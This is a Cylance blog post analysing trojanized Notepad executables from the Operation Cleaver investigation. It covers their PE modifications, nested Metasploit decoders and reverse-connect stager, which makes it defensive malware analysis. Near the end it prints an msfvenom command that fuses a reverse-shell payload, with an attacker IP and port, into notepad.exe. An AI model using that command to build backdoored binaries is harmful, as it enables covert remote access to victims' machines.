



Products







Our Products
CylancePROTECT®
CylancePROTECT + ThreatZERO
CylancePROTECT Home Edition
CylanceOPTICS
CylanceV



Get A Demo





Solution by Industry
Small and Medium Business
Critical Infrastructure
Education
Energy
Finance
Healthcare
Retail
Government







Services






Overview
Consulting
Immediate Incident Containment
Consulting By Practice Areas
Industrial Control Systems
IoT / Embedded Systems
Red Team Services
Incident Containment & Compromise Assessment
ThreatZERO
Training









Consulting By Industry
Retail
Energy
Education
Government
Critical Infrastructure
Healthcare
Finance







Partners







Partnership Levels
Program Overview
Solution Provider Partners
Cloud/MSSP Partners
OEM Partners
Global Partners









Quick Links
Partner Portal Login
Become a Partner
Partner Access Request








Resources



Resource Center





Blog





Education Services





What is AI?





Support








Events



Underworld Tour





Events & Trade Shows





Webinars








Company



Who We Are





News + Press





Awards & Recognitions





Certifications & Compliance





Careers





Contact Us







Products







Our Products
CylancePROTECT®
CylancePROTECT + ThreatZERO
CylancePROTECT Home Edition
CylanceOPTICS
CylanceV



Get A Demo





Solution by Industry
Small and Medium Business
Critical Infrastructure
Education
Energy
Finance
Healthcare
Retail
Government











Our Products
CylancePROTECT®
CylancePROTECT + ThreatZERO
CylancePROTECT Home Edition
CylanceOPTICS
CylanceV



Get A Demo





Solution by Industry
Small and Medium Business
Critical Infrastructure
Education
Energy
Finance
Healthcare
Retail
Government







Our Products
CylancePROTECT®
CylancePROTECT + ThreatZERO
CylancePROTECT Home Edition
CylanceOPTICS
CylanceV





Our Products
CylancePROTECT®
CylancePROTECT + ThreatZERO
CylancePROTECT Home Edition
CylanceOPTICS
CylanceV

Our Products
CylancePROTECT®
CylancePROTECT + ThreatZERO
CylancePROTECT Home Edition
CylanceOPTICS
CylanceV
Get A Demo


Solution by Industry
Small and Medium Business
Critical Infrastructure
Education
Energy
Finance
Healthcare
Retail
Government



Solution by Industry
Small and Medium Business
Critical Infrastructure
Education
Energy
Finance
Healthcare
Retail
Government

Solution by Industry
Small and Medium Business
Critical Infrastructure
Education
Energy
Finance
Healthcare
Retail
Government

Services






Overview
Consulting
Immediate Incident Containment
Consulting By Practice Areas
Industrial Control Systems
IoT / Embedded Systems
Red Team Services
Incident Containment & Compromise Assessment
ThreatZERO
Training









Consulting By Industry
Retail
Energy
Education
Government
Critical Infrastructure
Healthcare
Finance










Overview
Consulting
Immediate Incident Containment
Consulting By Practice Areas
Industrial Control Systems
IoT / Embedded Systems
Red Team Services
Incident Containment & Compromise Assessment
ThreatZERO
Training









Consulting By Industry
Retail
Energy
Education
Government
Critical Infrastructure
Healthcare
Finance






Overview
Consulting
Immediate Incident Containment
Consulting By Practice Areas
Industrial Control Systems
IoT / Embedded Systems
Red Team Services
Incident Containment & Compromise Assessment
ThreatZERO
Training





Overview
Consulting
Immediate Incident Containment
Consulting By Practice Areas
Industrial Control Systems
IoT / Embedded Systems
Red Team Services
Incident Containment & Compromise Assessment
ThreatZERO
Training


Overview
Consulting
Immediate Incident Containment
Consulting By Practice Areas
Industrial Control Systems
IoT / Embedded Systems
Red Team Services
Incident Containment & Compromise Assessment
ThreatZERO
Training


Consulting By Industry
Retail
Energy
Education
Government
Critical Infrastructure
Healthcare
Finance



Consulting By Industry
Retail
Energy
Education
Government
Critical Infrastructure
Healthcare
Finance

Consulting By Industry
Retail
Energy
Education
Government
Critical Infrastructure
Healthcare
Finance

Partners







Partnership Levels
Program Overview
Solution Provider Partners
Cloud/MSSP Partners
OEM Partners
Global Partners









Quick Links
Partner Portal Login
Become a Partner
Partner Access Request












Partnership Levels
Program Overview
Solution Provider Partners
Cloud/MSSP Partners
OEM Partners
Global Partners









Quick Links
Partner Portal Login
Become a Partner
Partner Access Request








Partnership Levels
Program Overview
Solution Provider Partners
Cloud/MSSP Partners
OEM Partners
Global Partners





Partnership Levels
Program Overview
Solution Provider Partners
Cloud/MSSP Partners
OEM Partners
Global Partners

Partnership Levels
Program Overview
Solution Provider Partners
Cloud/MSSP Partners
OEM Partners
Global Partners




Quick Links
Partner Portal Login
Become a Partner
Partner Access Request





Quick Links
Partner Portal Login
Become a Partner
Partner Access Request

Quick Links
Partner Portal Login
Become a Partner
Partner Access Request

Resources



Resource Center





Blog





Education Services





What is AI?





Support








Resource Center





Blog





Education Services





What is AI?





Support





Resource Center


Blog


Education Services


What is AI?


Support


Events



Underworld Tour





Events & Trade Shows





Webinars








Underworld Tour





Events & Trade Shows





Webinars





Underworld Tour


Events & Trade Shows


Webinars


Company



Who We Are





News + Press





Awards & Recognitions





Certifications & Compliance





Careers





Contact Us








Who We Are





News + Press





Awards & Recognitions





Certifications & Compliance





Careers





Contact Us





Who We Are


News + Press


Awards & Recognitions


Certifications & Compliance


Careers


Contact Us



EN


EN


DE


JP





EN


EN


DE


JP





EN


DE


JP



EN


DE


JP

Operation Cleaver: The Notepad Files

By
Derek Soeder
December 05, 2014



You see some strange stuff out there on the networks where attackers are active. Certainly the stash of files unearthed during the Operation Cleaver investigation included much of the bizarre and something of the terrible. Brian Wallace, who led the investigation, shared a mysterious set of samples with me awhile back, and now that Operation Cleaver is public, I'll relate the lurid technical details.
 
The Notepad Files
The files in question were found in a dim and dusty directory on a forlorn FTP server in the US, commingled with the detritus of past attack campaigns and successful compromises. They were at once familiar and strange, and they were made still stranger and more perplexing by their location and the circumstances of their discovery. All around them was a clutter of credential dumps, hacking utilities, RATs, and even legitimate software installers, but the files in question were none of these. They were Notepad.
 

Figure 1. The Notepad Doppelgängers.
 
Of course, a purloined Notepad icon in malware is nothing new, but something different was going on here. Within each of the two families, all of the samples had the same main icon, file size, and version information, yet each one had a distinct hash. At the time, only one of those five hashes existed on the internet: the official 32-bit Simplified Chinese Notepad from Windows XP x64 / Windows Server 2003. Suspecting that the remaining Notepads were derivatives of official Windows files, we associated the other member of the first family with the confirmed legitimate Notepad, and we matched the second family with the 32-bit US English Notepad from Windows 7 (not present in the original set).
 

MD5
File Name
File Size
File Version
83868cdff62829fe3b897e2720204679

notepad.exe

66,048

5.2.3790.3959, Chinese (Simplified, PRC)

bfc59f1f442686af73704eff6c0226f0

NOTEPAD2.EXE

179,712

6.1.7600.16385, English (United States)

e8ea10d5cde2e8661e9512fb684c4c98

Notepad3.exe

179,712

6.1.7600.16385, English (United States)

baa76a571329cdc4d7e98c398d80450c

Notepad4.exe

66,048

5.2.3790.3959, Chinese (Simplified, PRC)

19d9b37d3acf3468887a4d41bf70e9aa

notepad10.exe

179,712

6.1.7600.16385, English (United States

d378bffb70923139d6a4f546864aa61c

 --

179,712

6.1.7600.16385, English (United States)


83868cdff62829fe3b897e2720204679
notepad.exe
66,048
5.2.3790.3959, Chinese (Simplified, PRC)
bfc59f1f442686af73704eff6c0226f0
NOTEPAD2.EXE
179,712
6.1.7600.16385, English (United States)
e8ea10d5cde2e8661e9512fb684c4c98
Notepad3.exe
179,712
6.1.7600.16385, English (United States)
baa76a571329cdc4d7e98c398d80450c
Notepad4.exe
66,048
5.2.3790.3959, Chinese (Simplified, PRC)
19d9b37d3acf3468887a4d41bf70e9aa
notepad10.exe
179,712
6.1.7600.16385, English (United States
d378bffb70923139d6a4f546864aa61c
 --
179,712
6.1.7600.16385, English (United States)
 
Table 1. A summary of Notepad samples dug from the attackers' FTP drop, with the official Windows 7 Notepad appearing at bottom. It and the official Windows XP/2003 Notepad are represented in green.
 
Things got interesting when we started comparing the Notepads at the byte level. The image below depicts some byte differences between the original Windows 7 Notepad and samples NOTEPAD2.EXE and Notepad3.exe:
 

Figure 2. Comparison of the Windows 7 Notepad (green channel), NOTEPAD2.EXE (red channel), and Notepad3.exe (blue channel).
 
At the Portable Executable (PE) level, these differences translate to changes in the files' timestamps (IMAGE_NT_HEADERS.FileHeader.TimeDateStamp, offset 0xE8 in the figure above), the relative virtual addresses (RVAs) of their entry points (IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint, offset 0x108), and their checksums (IMAGE_NT_HEADERS.OptionalHeader.CheckSum, offset 0x138). The timestamps were rolled back by weeks to months relative to the legitimate progenitors' timestamps; we don't know why. The entry points retreated or advanced by hundreds of bytes to dozens of kilobytes, for reasons we'll explore shortly. And the checksums were all zeroed out, presumably because the file modifications invalidate them, invalid non-zero checksums are a tip-off, and zeroing is easier than recomputing.
So what's the story with all those other modifications? In all cases they seem to be confined to the ".text" section, centrally located to avoid the import directory, debug directory, load configuration directory, and import address table. This makes sense as a general precaution, considering that corrupting the import directory would unhelpfully crash the Windows loader during process initialization. The following image illustrates the distribution of modifications relative to these structures.
 

Figure 3. File locations of modifications (red) and the PE structures they avoid (gray). From left to right, the four vertical bars represent the ".text" sections of NOTEPAD2.EXE, Notepad3.exe, Notepad4.exe, and notepad10.exe, as compared to the original Notepad from their respective families. The Import Address Table (IAT), original entry point (OEP, green), malware entry point (EP, yellow), load configuration directory (LC), import directory (Imp), and debug directory (Dbg) are labeled.
 
While the arrangement of the structures varies among families, it's clear from the figure above that the region between structures containing the original entry point has in each case been filled with modifications. Notably, each sample has a short run of consecutive modifications immediately following the new entry point, and then a longer run elsewhere in the region. Presumably, both runs are injected malicious code, and the other modifications may well be random noise intended as a distraction. Since there are no other changes and no appended data, it's reasonable to assume that the code that makes a Notepad act like Notepad is simply gone, and that the samples will behave only maliciously. If true, then these modifications would represent a backdooring or "Trojanization" rather than a parasitic infection, and this distinction implies certain things about how the Notepads were made and how they might be used.
Tales from the Code
Let's take a look at the entry point code of the malicious Notepads and see if it aligns with our observations. The short answer is, it looks like nonsense. Here's a snippet from Notepad4.exe:
 
At this point the code becomes difficult to list due to instruction scission, or branching into the middle of an instruction (analogous to a frameshift error in DNA translation, if that helps). For instance, the JNP instruction at 010067FF is a two-byte instruction, and the JNZ branch at 010067F9, if satisfied, jumps to the JNP instruction's second byte at 01006800. That byte begins a different two-byte instruction, which incorporates what would have otherwise been the first byte of the instruction after the JNP, meaning its successor will start in the middle of JNP's successor, and so on. The two execution paths usually (but don't necessarily) converge after a few instructions.
The outcome of these instructions depends on the initial state of the registers, which is technically undefined. Seeing code operate on undefined values typically suggests that the bytes aren't code after all and so shouldn't have been disassembled. But keep looking. Notice that there are no memory accesses (which could raise an access violation), no stack pointer manipulation (which could cause a stack overflow or underflow), no division instructions (which could raise a divide exception), no invalid or privileged instructions, no interrupts or indirect branches--really, no uncontrolled execution transfers of any kind. Even more tellingly, all the possible execution paths seem to eventually flow to this code:
 
 
Here the gaps in the listing indicate when the disassembly follows an unconditional branch. The code seems to abruptly change character after the jump at 01006891, transitioning from gibberish to a string of short sequences connected by unconditional branches. This transition corresponds to a jump from the end of the short run of modifications (01006896) after the malware entry point to the beginning of the longer run of modifications (01005747) a few kilobytes before it.  (See the third column in Figure 3.)
In the disassembly above, the first sequence of green lines is a clear CALL-POP pair intended to obtain a code address in a position-independent way. (An immediate address value marked with a relocation would be the orthodox way to obtain a code pointer, but preparing that would have involved modifying the ".reloc" section.) No way is this construct a coincidence. Furthermore, the blue lines strongly resemble the setup for a VirtualAlloc call (VirtualAlloc(NULL, 0x1A9, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) typical of a deobfuscation stub, and the second set of green lines invoke the CALL-POPped function pointer with what one might readily assume is a hash of the string "VirtualAlloc". (It is.)
There's plenty more to observe in the disassembly, but, let's fast-forward past it.
windbg -c "bp kernel32!VirtualAlloc ; g" Notepad4.exe...
 

Figure 4. VirtualAlloc breakpoint hit. The parameters on the stack and the state of the registers are as expected.
 
 

Figure 5. Memory write (hardware) breakpoint hit after the last (0x1A9th) byte is written to allocated memory.
 
And now we can dump the extracted code from memory. It isn't immediately gratifying:
 
 
The byte 0xD6 at address 00100019 doesn't disassemble, and there aren't any branches skipping over it. But check out the instructions just above it referencing "[eax+19]". The code is in a sense self-modifying, flowing right into a portion of itself that it XOR decodes. The first decoded instruction is "LOOP 00100010" (0xD6 ^ 0x34 = 0xE2, the opcode for LOOP), which will execute the XOR loop body 99 more times (CL - 1 = 0x63 = 99) and then fall through to the newly-decoded code.
When we run this decoding stub (which, come to find out, is Metasploit's "shikata ga nai" decoder stub) to completion, we're rewarded with... another decoding stub:
 
 
Here, the first byte to be XORed is the second byte of the LOOP instruction, hence the nonsensical destination apparent in the pre-decoding disassembly above. (For brevity, we cut each listing at the first sign of encoding.) Run that to completion, and then...
 
 
And then...
 
 
And then...
 
 
Finally, at the end of six nested decoders, we see the light:
 
 
It looks like a call over a typical module or export lookup function. In fact, it is, and as the ROR-ADD pair suggests, it implements module name and export name hashing, the algorithms of which can be expressed as follows:
 
 
Still, this is all just preamble. What is the point that it eventually gets to?
 
You'd be forgiven for assuming that the tremendous amount of effort poured into obfuscation means there's some treasure beyond all fables at the bottom of this erstwhile Notepad. Sorry. It just downloads and executes a block of raw code. (Spoiler: it's actually a Metasploit reverse connect stager.) Here is its behavior summarized as function calls:
 
 
The above is known to be true for Notepad3.exe, Notepad4.exe, and notepad10.exe. NOTEPAD2.EXE doesn't seem to want to run, for reasons we didn't bother to troubleshoot for the bad guys.
 
Denouement
Unfortunately, we never did obtain a sample of the code that might have been downloaded. The key to that enigma-embedded, mystery-wrapped riddle is forever lost to us. The best we can do is read what's written in the Notepads and speculate as to why they exist at all.
Clearly whatever generator created these Notepads is far, far beyond the technical understanding of the Cleaver team. It stands to reason that there is a generator--no chance these were crafted by hand--and that its sophistication is even greater than that of its output. Something like that wouldn't be used only once. Something like that, if this team was able to get ahold of it, must be out there. Turn the right corner of the internet, and you can find anything...
Well it so happens that we did eventually find it. Some of you have no doubt suspected it all along, and now I'll humbly confirm it for you: the Notepads were, in their entirety, generated by Metasploit. Something along the lines of "msfvenom -x notepad.exe -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=108.175.152.230 LPORT=12345 > Notepad4.exe". The "msfvenom" tool transmogrifies a Metasploit payload into a standalone EXE, and with the "-x" switch, it'll fuse the payload--encoded as desired--into a copy of an existing executable, exhibiting exactly the behavior we just described. Omne ignotum pro magnifico. Perhaps the more bizarre a thing is, the less mysterious it proves to be.
However, we're still left to wonder what Cleaver was up to when they generated all those Notepads. One conclusion Brian proposed is that they're intended as backdoors--replacements for the legitimate Notepad on a compromised system--which would enable Cleaver to regain access to a system at some indeterminate time in the future, the next time a user runs Notepad. The team demonstrated a similarly intentioned tactic with a connect-back shell scheduled to run in a six-minute window each night; the Notepad replacement, while more intrusive, could be another example of this contingency planning tendency.
Or maybe the Notepads were only an aborted experiment, attempted and shelved, forgotten in a flurry of compromises and criminal activity. If nothing else, they made for an unexpected bit of mystery.
 

CylancePROTECT®
CylancePROTECT + ThreatZERO
CylancePROTECT Home Edition
CylanceOPTICS™
CylanceV

CylancePROTECT for Critical Infrastructure
CylancePROTECT for Education
CylancePROTECT for Energy
CylancePROTECT for Finance
CylancePROTECT for Healthcare
CylancePROTECT for Retail
CylancePROTECT for Federal Government

CylancePROTECT®
CylancePROTECT + ThreatZERO
CylancePROTECT Home Edition
CylanceOPTICS™
CylanceV

CylancePROTECT for Critical Infrastructure
CylancePROTECT for Education
CylancePROTECT for Energy
CylancePROTECT for Finance
CylancePROTECT for Healthcare
CylancePROTECT for Retail
CylancePROTECT for Federal Government

Consulting Overview







Consulting for Retail
Consulting for Energy
Consulting for Education 
Consulting for Government
Consulting for Critical Infrastructure
Consulting for Healthcare
Consulting for Finance

Consulting Overview







Consulting for Retail
Consulting for Energy
Consulting for Education 
Consulting for Government
Consulting for Critical Infrastructure
Consulting for Healthcare
Consulting for Finance

Program Overview
Solution Provider Partners
Cloud/MSSP Partners




Become a Partner
Partner Access Request

Program Overview
Solution Provider Partners
Cloud/MSSP Partners




Become a Partner
Partner Access Request

Resource Center





Resource Center





Underworld Tour

Events & Trade Shows
Webinars

Underworld Tour

Events & Trade Shows
Webinars

Who We Are
News + Press
Awards & Recognitions


Contact Us

Who We Are
News + Press
Awards & Recognitions


Contact Us
REQUEST A DEMO
Convinced that the next generation of endpoint security solutions are right for your organization? Contact a Cylance expert to get a demo of our solutions.



<script>



/**



 * push Marketo form events and values to Google Tag Manager via the data layer



 * uses the Marketo Forms 2.0 API



 * http://developers.marketo.com/documentation/websites/forms-2-0/



 *



 * @author Keith W. Shaw <keith.w.shaw@gmail.com>



 * @license MIT



 */



(function marketoFormListener (MktoForms2) {







 "use strict";







 /**



     * helper function to push invalid Marketo field errors to GTM



     * @returns {undefined}



 */



 function waitForError () {







 var element, input, mktoErrorMsg;







 // check for error message



        element = document.querySelector(".mktoErrorMsg");



 if (element) {







            mktoErrorMsg = element.textContent || element.innerText;







 // look for invalid input



            input = document.querySelector("input.mktoInvalid, .mktoInvalid input");



 window.dataLayer.push({



 "event": "mkto.form.error",



 "mkto.form.error.message": mktoErrorMsg,



 "gtm.element": input,



 "gtm.elementClasses": input && input.className || "",



 "gtm.elementId": input && input.id || "",



 "gtm.elementName": input && input.name || "",



 "gtm.elementTarget": input && input.target || ""



            });







        }







    }







 if (MktoForms2) {







 MktoForms2.whenReady(function handleReady (form) {







 window.dataLayer.push({



 "event": "mkto.form.ready",



 "mkto.form.id": form.getId(),



 "mkto.form.submittable": form.submittable(),



 "mkto.form.allFieldsFilled": form.allFieldsFilled(),



 "mkto.form.values": form.getValues()



            });



 form.onValidate(function handleValidate (valid) {







 window.dataLayer.push({



 "event": "mkto.form.validate",



 "mkto.form.valid": valid



                });







 // wait for the error message to appear



 setTimeout(waitForError, 0);







            });



 form.onSubmit(function handleSubmit (thisForm) {







 var button;







                button = thisForm.getFormElem().find("button[type=\"submit\"]");







 window.dataLayer.push({



 "event": "mkto.form.submit",



 "mkto.form.id": thisForm.getId(),



 "mkto.form.submittable": thisForm.submittable(),



 "mkto.form.allFieldsFilled": thisForm.allFieldsFilled(),



 "mkto.form.values": thisForm.getValues(),



 "mkto.form.button": {



 "classes": button.attr("class"),



 "text": button.text(),



 "type": "submit"



                    }



                });







            });



 form.onSuccess(function handleSuccess (values, followUpUrl) {







 window.dataLayer.push({



 "event": "mkto.form.success",



 "mkto.form.values": values,



 "mkto.form.followUpUrl": followUpUrl



                });







            });







        });







 MktoForms2.whenRendered(function handleRendered (form) {







 window.dataLayer.push({



 "event": "mkto.form.rendered",



 "mkto.form.id": form.getId(),



 "mkto.form.submittable": form.submittable(),



 "mkto.form.allFieldsFilled": form.allFieldsFilled(),



 "mkto.form.values": form.getValues()



            });







        });







    }







}(window.MktoForms2));



</script>


